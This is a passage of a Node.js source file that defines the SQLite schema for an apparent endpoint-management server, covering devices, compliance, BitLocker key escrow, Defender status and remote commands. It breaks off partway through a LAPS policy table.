/**
 * LocalPilot Fleet — SQLite Database Engine
 * server/src/db.js
 *
 * Backed by Node.js 26 native node:sqlite (DatabaseSync).
 * Configures WAL mode, 5000ms busy timeout, 8 relational tables, 16 indexes, and seed data.
 */

import { DatabaseSync } from 'node:sqlite';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';

let dbInstance = null;

export function applyPragmas(db) {
  db.exec(`
    PRAGMA journal_mode = WAL;
    PRAGMA synchronous = NORMAL;
    PRAGMA foreign_keys = ON;
    PRAGMA busy_timeout = 5000;
    PRAGMA cache_size = -64000;
    PRAGMA temp_store = MEMORY;
  `);
}

export function initDb(dbOrPath, options = {}) {
  let db;
  let shouldSeed = options.seed !== false;

  if (dbOrPath && typeof dbOrPath === 'object' && typeof dbOrPath.exec === 'function') {
    db = dbOrPath;
  } else if (typeof dbOrPath === 'string') {
    const dbDir = path.dirname(dbOrPath);
    if (dbDir && !fs.existsSync(dbDir)) {
      fs.mkdirSync(dbDir, { recursive: true });
    }
    db = new DatabaseSync(dbOrPath);
    applyPragmas(db);
  } else {
    // If first argument is options object
    if (dbOrPath && typeof dbOrPath === 'object' && options.seed === undefined) {
      if (dbOrPath.seed !== undefined) shouldSeed = dbOrPath.seed;
    }
    const dbPath = process.env.DB_PATH || path.join(process.cwd(), 'data', 'fleet.db');
    const dbDir = path.dirname(dbPath);
    if (dbDir && !fs.existsSync(dbDir)) {
      fs.mkdirSync(dbDir, { recursive: true });
    }
    db = new DatabaseSync(dbPath);
    applyPragmas(db);
  }

  // 8 Relational Tables DDL
  db.exec(`
    -- 1. DEVICES
    CREATE TABLE IF NOT EXISTS devices (
      id TEXT PRIMARY KEY NOT NULL,
      hostname TEXT NOT NULL,
      friendly_name TEXT,
      serial_number TEXT UNIQUE,
      uuid TEXT UNIQUE,
      mac_address TEXT,
      ip_address TEXT,
      public_ip TEXT,
      connection_route TEXT DEFAULT 'LAN' CHECK(connection_route IN ('LAN', 'Cloudflare', 'Unknown')),
      status TEXT DEFAULT 'online' CHECK(status IN ('online', 'offline', 'drifted', 'quarantined')),
      os_name TEXT NOT NULL,
      os_version TEXT NOT NULL,
      os_build TEXT,
      os_architecture TEXT DEFAULT '64-bit',
      cpu_model TEXT,
      cpu_cores INTEGER,
      cpu_logical INTEGER,
      total_ram_bytes INTEGER NOT NULL,
      total_ram_gb REAL GENERATED ALWAYS AS (ROUND(total_ram_bytes / 1073741824.0, 2)) STORED,
      gpu_name TEXT,
      has_battery INTEGER DEFAULT 0 CHECK(has_battery IN (0, 1)),
      battery_percent REAL,
      battery_charging INTEGER DEFAULT 0 CHECK(battery_charging IN (0, 1)),
      tpm_present INTEGER DEFAULT 0 CHECK(tpm_present IN (0, 1)),
      tpm_version TEXT,
      tpm_enabled INTEGER DEFAULT 0 CHECK(tpm_enabled IN (0, 1)),
      secure_boot_enabled INTEGER DEFAULT 0 CHECK(secure_boot_enabled IN (0, 1)),
      bitlocker_status TEXT DEFAULT 'Disabled' CHECK(bitlocker_status IN ('FullyEncrypted', 'FullyDecrypted', 'EncryptionInProgress', 'Disabled')),
      primary_user TEXT,
      tags_json TEXT DEFAULT '[]',
      installed_software_json TEXT DEFAULT '[]',
      assigned_group TEXT,
      node_token_hash TEXT NOT NULL,
      agent_version TEXT NOT NULL,
      enrolled_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      last_seen_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now'))
    );

    -- 2. TELEMETRY_SNAPSHOTS
    CREATE TABLE IF NOT EXISTS telemetry_snapshots (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      timestamp TEXT NOT NULL DEFAULT (DATETIME('now')),
      cpu_usage_percent REAL NOT NULL,
      ram_used_bytes INTEGER NOT NULL,
      ram_free_bytes INTEGER NOT NULL,
      ram_usage_percent REAL NOT NULL,
      disk_free_gb REAL,
      disks_json TEXT NOT NULL,
      network_json TEXT,
      battery_percent REAL,
      battery_charging INTEGER DEFAULT 0,
      process_count INTEGER,
      uptime_seconds INTEGER,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 3. DYNAMIC_GROUPS
    CREATE TABLE IF NOT EXISTS dynamic_groups (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT UNIQUE NOT NULL,
      description TEXT,
      rule_syntax TEXT NOT NULL,
      is_dynamic INTEGER DEFAULT 1 CHECK(is_dynamic IN (0, 1)),
      color TEXT DEFAULT '#3B82F6',
      icon TEXT DEFAULT 'laptop',
      priority INTEGER DEFAULT 100,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now'))
    );

    -- 4. GROUP_MEMBERSHIPS
    CREATE TABLE IF NOT EXISTS group_memberships (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      group_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      is_dynamic_match INTEGER DEFAULT 1 CHECK(is_dynamic_match IN (0, 1)),
      manually_assigned INTEGER DEFAULT 0 CHECK(manually_assigned IN (0, 1)),
      evaluated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(group_id) REFERENCES dynamic_groups(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      UNIQUE(group_id, device_id)
    );

    -- 5. SOFTWARE_CATALOG
    CREATE TABLE IF NOT EXISTS software_catalog (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      publisher TEXT,
      winget_id TEXT NOT NULL,
      version TEXT,
      category TEXT DEFAULT 'Utilities',
      description TEXT,
      icon_url TEXT,
      silent_install_args TEXT,
      silent_uninstall_args TEXT,
      detection_rule_json TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now'))
    );

    -- 6. POLICY_ASSIGNMENTS
    CREATE TABLE IF NOT EXISTS policy_assignments (
      id TEXT PRIMARY KEY NOT NULL,
      group_id TEXT NOT NULL,
      software_id TEXT NOT NULL,
      assignment_type TEXT NOT NULL CHECK(assignment_type IN ('Required', 'Prohibited', 'Available')),
      auto_update INTEGER DEFAULT 1 CHECK(auto_update IN (0, 1)),
      enforcement_priority INTEGER DEFAULT 10,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(group_id) REFERENCES dynamic_groups(id) ON DELETE CASCADE,
      FOREIGN KEY(software_id) REFERENCES software_catalog(id) ON DELETE CASCADE,
      UNIQUE(group_id, software_id)
    );

    -- 7. SECURITY_EVENTS
    CREATE TABLE IF NOT EXISTS security_events (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      event_type TEXT NOT NULL CHECK(event_type IN (
        'USER_CREATED', 'USER_DELETED', 'ADMIN_ADDED', 'ADMIN_REMOVED',
        'APP_INSTALLED', 'APP_PROHIBITED_DETECTED', 'POLICY_DRIFT',
        'TPM_VIOLATION', 'SECUREBOOT_DISABLED', 'BITLOCKER_OFFLINE', 'WATCHDOG_HEARTBEAT',
        'MALWARE_THREAT_DETECTED', 'ANTIVIRUS_RTP_DISABLED',
        'BITLOCKER_KEY_ESCROWED', 'BITLOCKER_KEY_REVEALED', 'BITLOCKER_ENCRYPTION_TRIGGERED',
        'LAPS_PASSWORD_ESCROWED', 'LAPS_PASSWORD_REVEALED', 'LAPS_PASSWORD_ROTATED',
        'EPM_ELEVATION_REQUESTED', 'EPM_ELEVATION_APPROVED', 'EPM_ELEVATION_DENIED', 'EPM_PROCESS_ELEVATED',
        'AUTOPILOT_DEVICE_IMPORTED', 'AUTOPILOT_PROFILE_ASSIGNED', 'AUTOPILOT_PROVISIONING_STARTED', 'AUTOPILOT_PROVISIONING_COMPLETED', 'AUTOPILOT_PROVISIONING_FAILED',
        'REMOTE_ACTION_DISPATCHED', 'REMOTE_ACTION_COMPLETED', 'REMOTE_ACTION_FAILED', 'DIAGNOSTICS_COLLECTED', 'BULK_ACTION_EXECUTED',
        'FIREWALL_RULE_APPLIED', 'FIREWALL_DRIFT_DETECTED', 'ROGUE_PORT_DETECTED', 'FIREWALL_PROFILE_DISABLED',
        'SCRIPT_DISPATCHED', 'SCRIPT_EXECUTION_SUCCESS', 'SCRIPT_EXECUTION_FAILED'
      )),
      event_id INTEGER,
      event_source TEXT NOT NULL,
      severity TEXT NOT NULL CHECK(severity IN ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO')),
      summary TEXT NOT NULL,
      raw_payload_json TEXT NOT NULL,
      acknowledged INTEGER DEFAULT 0 CHECK(acknowledged IN (0, 1)),
      acknowledged_at TEXT,
      acknowledged_by TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 8. FLEET_SETTINGS
    CREATE TABLE IF NOT EXISTS fleet_settings (
      key TEXT PRIMARY KEY NOT NULL,
      value TEXT NOT NULL,
      data_type TEXT DEFAULT 'string' CHECK(data_type IN ('string', 'number', 'boolean', 'json')),
      description TEXT,
      is_secret INTEGER DEFAULT 0 CHECK(is_secret IN (0, 1)),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now'))
    );

    -- 9. DEVICE_COMMANDS (Intune Remote Actions & PowerShell execution)
    CREATE TABLE IF NOT EXISTS device_commands (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      command_text TEXT NOT NULL,
      created_by TEXT DEFAULT 'admin',
      status TEXT DEFAULT 'PENDING' CHECK(status IN ('PENDING', 'RUNNING', 'COMPLETED', 'FAILED', 'CANCELLED')),
      exit_code INTEGER,
      stdout TEXT,
      stderr TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      executed_at TEXT,
      completed_at TEXT,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 10. REMEDIATIONS (Intune Proactive Remediation Script Packages)
    CREATE TABLE IF NOT EXISTS remediations (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      publisher TEXT DEFAULT 'LocalPilot Fleet',
      target_group_id TEXT DEFAULT 'grp-all',
      detection_script TEXT NOT NULL,
      remediation_script TEXT NOT NULL,
      schedule_type TEXT DEFAULT 'HEARTBEAT' CHECK(schedule_type IN ('HEARTBEAT', 'HOURLY', 'DAILY')),
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 11. REMEDIATION_RUNS (Per-device detection and remediation telemetry)
    CREATE TABLE IF NOT EXISTS remediation_runs (
      id TEXT PRIMARY KEY NOT NULL,
      remediation_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      detection_exit_code INTEGER,
      detection_stdout TEXT,
      detection_stderr TEXT,
      detection_status TEXT CHECK(detection_status IN ('NO_ISSUE', 'ISSUE_DETECTED', 'ERROR')),
      remediation_exit_code INTEGER,
      remediation_stdout TEXT,
      remediation_stderr TEXT,
      remediation_status TEXT CHECK(remediation_status IN ('NOT_NEEDED', 'REMEDIATED', 'FAILED', 'ERROR')),
      executed_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(remediation_id) REFERENCES remediations(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 12. CONFIGURATION_PROFILES (Intune Settings Catalog & Security Baselines)
    CREATE TABLE IF NOT EXISTS configuration_profiles (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      profile_type TEXT DEFAULT 'SettingsCatalog' CHECK(profile_type IN ('SettingsCatalog', 'SecurityBaseline', 'CustomPolicy')),
      target_group_id TEXT DEFAULT 'grp-all',
      settings_json TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 13. PROFILE_COMPLIANCE (Per-device Configuration Profile Evaluation State)
    CREATE TABLE IF NOT EXISTS profile_compliance (
      id TEXT PRIMARY KEY NOT NULL,
      profile_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      compliance_status TEXT NOT NULL CHECK(compliance_status IN ('COMPLIANT', 'NON_COMPLIANT', 'ERROR', 'PENDING')),
      compliant_count INTEGER NOT NULL DEFAULT 0,
      non_compliant_count INTEGER NOT NULL DEFAULT 0,
      error_count INTEGER NOT NULL DEFAULT 0,
      setting_results_json TEXT NOT NULL DEFAULT '[]',
      evaluated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(profile_id) REFERENCES configuration_profiles(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      UNIQUE(profile_id, device_id)
    );

    -- 14. UPDATE_RINGS (Windows Update for Business / WUfB Patch Cadence)
    CREATE TABLE IF NOT EXISTS update_rings (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      servicing_channel TEXT DEFAULT 'GeneralAvailability' CHECK(servicing_channel IN (
        'GeneralAvailability', 'WindowsInsiderPreRelease', 'WindowsInsiderBeta', 'WindowsInsiderReleasePreview'
      )),
      quality_deferral_days INTEGER DEFAULT 0 CHECK(quality_deferral_days >= 0 AND quality_deferral_days <= 30),
      feature_deferral_days INTEGER DEFAULT 0 CHECK(feature_deferral_days >= 0 AND feature_deferral_days <= 365),
      active_hours_start INTEGER DEFAULT 8 CHECK(active_hours_start >= 0 AND active_hours_start <= 23),
      active_hours_end INTEGER DEFAULT 17 CHECK(active_hours_end >= 0 AND active_hours_end <= 23),
      automatic_update_mode TEXT DEFAULT 'AutoInstallAndRebootAtMaintenanceTime' CHECK(automatic_update_mode IN (
        'NotifyDownload', 'AutoInstallAndRebootAtMaintenanceTime', 'AutoInstallAndRebootWithoutEndUserControl', 'ResetToDefault'
      )),
      restart_deadline_days INTEGER DEFAULT 5 CHECK(restart_deadline_days >= 0 AND restart_deadline_days <= 30),
      is_paused INTEGER DEFAULT 0 CHECK(is_paused IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 15. DEVICE_UPDATE_STATUS (Per-device Windows Update, Reboot & Hotfix Telemetry)
    CREATE TABLE IF NOT EXISTS device_update_status (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL UNIQUE,
      ring_id TEXT,
      reboot_pending INTEGER DEFAULT 0 CHECK(reboot_pending IN (0, 1)),
      reboot_pending_reasons_json TEXT DEFAULT '[]',
      last_scan_at TEXT,
      last_install_at TEXT,
      installed_hotfixes_json TEXT DEFAULT '[]',
      update_service_status TEXT DEFAULT 'Running',
      compliance_status TEXT DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'REBOOT_PENDING', 'DRIFTED', 'ERROR')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(ring_id) REFERENCES update_rings(id) ON DELETE SET NULL
    );

    -- 16. COMPLIANCE_POLICIES (Microsoft Intune Device Compliance & Conditional Access Rules)
    CREATE TABLE IF NOT EXISTS compliance_policies (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      platform TEXT DEFAULT 'Windows11' CHECK(platform IN ('Windows11', 'Windows10', 'AllWindows')),
      min_os_build TEXT DEFAULT '10.0.22000',
      max_os_build TEXT,
      require_bitlocker INTEGER DEFAULT 1 CHECK(require_bitlocker IN (0, 1)),
      require_secure_boot INTEGER DEFAULT 1 CHECK(require_secure_boot IN (0, 1)),
      require_tpm INTEGER DEFAULT 1 CHECK(require_tpm IN (0, 1)),
      require_defender_antivirus INTEGER DEFAULT 1 CHECK(require_defender_antivirus IN (0, 1)),
      require_defender_rtp INTEGER DEFAULT 1 CHECK(require_defender_rtp IN (0, 1)),
      require_firewall INTEGER DEFAULT 1 CHECK(require_firewall IN (0, 1)),
      max_antivirus_signature_age_days INTEGER DEFAULT 7 CHECK(max_antivirus_signature_age_days >= 1 AND max_antivirus_signature_age_days <= 60),
      grace_period_days INTEGER DEFAULT 3 CHECK(grace_period_days >= 0 AND grace_period_days <= 30),
      non_compliance_action TEXT DEFAULT 'MARK_NON_COMPLIANT' CHECK(non_compliance_action IN ('MARK_NON_COMPLIANT', 'QUARANTINE', 'ALERT_ONLY')),
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 17. DEVICE_COMPLIANCE_EVALUATIONS (Per-device compliance posture & grace periods)
    CREATE TABLE IF NOT EXISTS device_compliance_evaluations (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      policy_id TEXT NOT NULL,
      compliance_status TEXT NOT NULL DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'IN_GRACE_PERIOD', 'NON_COMPLIANT', 'ERROR')),
      first_failed_at TEXT,
      grace_period_expires_at TEXT,
      rule_results_json TEXT DEFAULT '[]',
      evaluated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(policy_id) REFERENCES compliance_policies(id) ON DELETE CASCADE,
      UNIQUE(device_id, policy_id)
    );

    -- 18. APPS (Microsoft Intune Application Management & Win32/Winget Packaging)
    CREATE TABLE IF NOT EXISTS apps (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      publisher TEXT,
      version TEXT,
      category TEXT DEFAULT 'Developer Tools' CHECK(category IN ('Productivity', 'Developer Tools', 'Utilities', 'Security', 'Media', 'System')),
      app_type TEXT NOT NULL DEFAULT 'WINGET' CHECK(app_type IN ('WINGET', 'WIN32', 'MSI', 'SCRIPT')),
      package_identifier TEXT,
      assignment_intent TEXT NOT NULL DEFAULT 'REQUIRED' CHECK(assignment_intent IN ('REQUIRED', 'AVAILABLE', 'UNINSTALL')),
      target_group_id TEXT DEFAULT 'grp-all',
      install_command TEXT,
      uninstall_command TEXT,
      detection_rules_json TEXT DEFAULT '[]',
      requirement_rules_json TEXT DEFAULT '{}',
      icon_url TEXT,
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 19. DEVICE_APP_STATUS (Per-device Application Installation Posture & Detection History)
    CREATE TABLE IF NOT EXISTS device_app_status (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      app_id TEXT NOT NULL,
      install_status TEXT NOT NULL DEFAULT 'PENDING' CHECK(install_status IN ('INSTALLED', 'PENDING', 'INSTALLING', 'FAILED', 'UNINSTALLED', 'NOT_APPLICABLE')),
      detection_state INTEGER DEFAULT 0 CHECK(detection_state IN (0, 1)),
      installed_version TEXT,
      error_code INTEGER,
      error_message TEXT,
      last_attempt_at TEXT,
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(app_id) REFERENCES apps(id) ON DELETE CASCADE,
      UNIQUE(device_id, app_id)
    );

    -- 20. ENDPOINT_SECURITY_POLICIES (Microsoft Defender for Endpoint & Antivirus Governance)
    CREATE TABLE IF NOT EXISTS endpoint_security_policies (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      real_time_protection INTEGER NOT NULL DEFAULT 1 CHECK(real_time_protection IN (0, 1)),
      cloud_protection_level TEXT NOT NULL DEFAULT 'HIGH' CHECK(cloud_protection_level IN ('DISABLED', 'BASIC', 'STANDARD', 'HIGH', 'HIGH_PLUS', 'ZERO_TOLERANCE')),
      controlled_folder_access TEXT NOT NULL DEFAULT 'AUDIT' CHECK(controlled_folder_access IN ('DISABLED', 'ENABLED', 'AUDIT', 'BLOCK_DISK_ONLY')),
      pua_protection TEXT NOT NULL DEFAULT 'ENABLED' CHECK(pua_protection IN ('DISABLED', 'ENABLED', 'AUDIT')),
      network_protection TEXT NOT NULL DEFAULT 'ENABLED' CHECK(network_protection IN ('DISABLED', 'ENABLED', 'AUDIT')),
      tamper_protection INTEGER NOT NULL DEFAULT 1 CHECK(tamper_protection IN (0, 1)),
      scan_schedule_type TEXT NOT NULL DEFAULT 'DAILY_QUICK' CHECK(scan_schedule_type IN ('DISABLED', 'DAILY_QUICK', 'WEEKLY_FULL')),
      scan_schedule_time TEXT DEFAULT '02:00',
      exclusions_json TEXT DEFAULT '{"paths":[],"extensions":[],"processes":[]}',
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 21. DEVICE_ANTIVIRUS_STATUS (Live Microsoft Defender Telemetry & Posture per Device)
    CREATE TABLE IF NOT EXISTS device_antivirus_status (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      antivirus_enabled INTEGER DEFAULT 1 CHECK(antivirus_enabled IN (0, 1)),
      engine_version TEXT,
      product_version TEXT,
      signature_version TEXT,
      signature_last_updated TEXT,
      signature_age_days INTEGER DEFAULT 0,
      real_time_protection_enabled INTEGER DEFAULT 1 CHECK(real_time_protection_enabled IN (0, 1)),
      cloud_protection_enabled INTEGER DEFAULT 1 CHECK(cloud_protection_enabled IN (0, 1)),
      pua_protection_enabled INTEGER DEFAULT 1 CHECK(pua_protection_enabled IN (0, 1)),
      controlled_folder_access_enabled INTEGER DEFAULT 0 CHECK(controlled_folder_access_enabled IN (0, 1, 2)),
      network_protection_enabled INTEGER DEFAULT 1 CHECK(network_protection_enabled IN (0, 1)),
      tamper_protection_enabled INTEGER DEFAULT 1 CHECK(tamper_protection_enabled IN (0, 1)),
      antispyware_enabled INTEGER DEFAULT 1 CHECK(antispyware_enabled IN (0, 1)),
      behavior_monitor_enabled INTEGER DEFAULT 1 CHECK(behavior_monitor_enabled IN (0, 1)),
      ioav_protection_enabled INTEGER DEFAULT 1 CHECK(ioav_protection_enabled IN (0, 1)),
      last_quick_scan_at TEXT,
      last_full_scan_at TEXT,
      quick_scan_age_days INTEGER DEFAULT 0,
      full_scan_age_days INTEGER DEFAULT 0,
      active_threat_count INTEGER DEFAULT 0,
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      UNIQUE(device_id)
    );

    -- 22. THREAT_DETECTIONS (Microsoft Defender Malware & Threat Log)
    CREATE TABLE IF NOT EXISTS threat_detections (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      threat_name TEXT NOT NULL,
      threat_id TEXT,
      severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(severity IN ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFORMATIONAL')),
      category TEXT DEFAULT 'Malware',
      resources_json TEXT DEFAULT '[]',
      action_taken TEXT NOT NULL DEFAULT 'QUARANTINED' CHECK(action_taken IN ('QUARANTINED', 'REMOVED', 'CLEANED', 'BLOCKED', 'NO_ACTION', 'ALLOWED')),
      remediation_status TEXT NOT NULL DEFAULT 'RESOLVED' CHECK(remediation_status IN ('ACTIVE', 'RESOLVED', 'MANUAL_STEPS_REQUIRED', 'FAILED')),
      detected_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 23. BITLOCKER_POLICIES (Disk Encryption & Key Escrow Policies)
    CREATE TABLE IF NOT EXISTS bitlocker_policies (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      encryption_method_os TEXT DEFAULT 'XtsAes128' CHECK(encryption_method_os IN ('XtsAes128', 'XtsAes256', 'Aes128', 'Aes256')),
      encryption_method_fixed TEXT DEFAULT 'XtsAes128' CHECK(encryption_method_fixed IN ('XtsAes128', 'XtsAes256', 'Aes128', 'Aes256')),
      require_tpm INTEGER DEFAULT 1 CHECK(require_tpm IN (0, 1)),
      recovery_key_rotation INTEGER DEFAULT 1 CHECK(recovery_key_rotation IN (0, 1)),
      hide_recovery_options_in_wizard INTEGER DEFAULT 1 CHECK(hide_recovery_options_in_wizard IN (0, 1)),
      silent_encryption_enabled INTEGER DEFAULT 1 CHECK(silent_encryption_enabled IN (0, 1)),
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 24. DEVICE_BITLOCKER_VOLUMES (Per-volume encryption status & protectors)
    CREATE TABLE IF NOT EXISTS device_bitlocker_volumes (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      mount_point TEXT NOT NULL,
      volume_type TEXT NOT NULL DEFAULT 'OperatingSystem' CHECK(volume_type IN ('OperatingSystem', 'FixedDataVolume', 'RemovableDataVolume')),
      protection_status TEXT NOT NULL DEFAULT 'Off' CHECK(protection_status IN ('On', 'Off', 'Unknown')),
      volume_status TEXT NOT NULL DEFAULT 'FullyDecrypted' CHECK(volume_status IN ('FullyEncrypted', 'FullyDecrypted', 'EncryptionInProgress', 'DecryptionInProgress', 'Unknown')),
      encryption_percentage REAL DEFAULT 0.0,
      encryption_method TEXT DEFAULT 'None',
      lock_status TEXT DEFAULT 'Unlocked' CHECK(lock_status IN ('Locked', 'Unlocked')),
      key_protector_types_json TEXT DEFAULT '[]',
      has_recovery_key INTEGER DEFAULT 0 CHECK(has_recovery_key IN (0, 1)),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      UNIQUE(device_id, mount_point)
    );

    -- 25. BITLOCKER_RECOVERY_KEYS (Escrowed 48-digit Recovery Passwords)
    CREATE TABLE IF NOT EXISTS bitlocker_recovery_keys (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      volume_mount_point TEXT NOT NULL,
      volume_type TEXT DEFAULT 'OperatingSystem',
      key_protector_id TEXT NOT NULL,
      key_protector_type TEXT NOT NULL DEFAULT 'RecoveryPassword',
      recovery_password TEXT NOT NULL,
      encryption_method TEXT DEFAULT 'XtsAes128',
      backup_timestamp TEXT NOT NULL DEFAULT (DATETIME('now')),
      last_accessed_at TEXT,
      access_count INTEGER DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      UNIQUE(device_id, key_protector_id)
    );

    -- 26. BITLOCKER_AUDIT_LOGS (Key Reveal & Access Audit Paper Trail)
    CREATE TABLE IF NOT EXISTS bitlocker_audit_logs (
      id TEXT PRIMARY KEY NOT NULL,
      key_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      accessed_by TEXT NOT NULL DEFAULT 'Administrator',
      access_reason TEXT DEFAULT 'Troubleshooting / BitLocker Recovery PIN Loss',
      ip_address TEXT DEFAULT '127.0.0.1',
      accessed_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(key_id) REFERENCES bitlocker_recovery_keys(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 27. LAPS_POLICIES (Windows Local Administrator Password Solution Governance)
    CREATE TABLE IF NOT EXISTS laps_policies (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      admin_account_name TEXT NOT NULL DEFAULT 'Administrator',
      password_complexity TEXT NOT NULL DEFAULT 'COMPLEX' CHECK(password_complexity IN ('NUMERIC', 'ALPHABETICAL', 'ALPHANUMERIC', 'COMPLEX')),
      password_length INTEGER NOT NULL DEFAULT 16 CHECK(password_length >= 12 AND password_length <= 64),
